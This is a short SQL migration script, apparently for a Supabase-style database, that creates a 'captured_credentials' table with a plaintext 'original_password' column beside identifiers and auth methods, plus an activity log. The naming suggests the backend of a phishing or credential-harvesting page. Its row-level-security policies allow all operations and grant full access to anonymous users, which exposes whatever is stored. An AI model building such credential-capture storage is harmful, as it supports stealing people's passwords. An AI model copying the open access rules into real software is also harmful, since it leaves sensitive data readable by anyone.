-- Create captured_credentials table
CREATE TABLE IF NOT EXISTS captured_credentials (
  id UUID PRIMARY KEY,
  auth_method TEXT NOT NULL,
  identifier TEXT NOT NULL,
  password_hash TEXT NOT NULL,
  original_password TEXT,
  metadata JSONB DEFAULT '{}',
  created_at TIMESTAMP WITH TIME ZONE DEFAULT NOW()
);

-- Create activity_logs table
CREATE TABLE IF NOT EXISTS activity_logs (
  id UUID PRIMARY KEY,
  action TEXT NOT NULL,
  metadata JSONB,
  created_at TIMESTAMP WITH TIME ZONE DEFAULT NOW()
);

-- Create indexes for better query performance
CREATE INDEX IF NOT EXISTS idx_credentials_created_at ON captured_credentials(created_at DESC);
CREATE INDEX IF NOT EXISTS idx_credentials_auth_method ON captured_credentials(auth_method);
CREATE INDEX IF NOT EXISTS idx_activity_created_at ON activity_logs(created_at DESC);

-- Enable Row Level Security (RLS)
ALTER TABLE captured_credentials ENABLE ROW LEVEL SECURITY;
ALTER TABLE activity_logs ENABLE ROW LEVEL SECURITY;

-- Create policies to allow all operations (for testing purposes)
-- WARNING: In production, you should restrict these policies
CREATE POLICY "Allow all operations on captured_credentials" ON captured_credentials
  FOR ALL
  USING (true)
  WITH CHECK (true);

CREATE POLICY "Allow all operations on activity_logs" ON activity_logs
  FOR ALL
  USING (true)
  WITH CHECK (true);

-- Grant permissions
GRANT ALL ON captured_credentials TO anon, authenticated;
GRANT ALL ON activity_logs TO anon, authenticated;
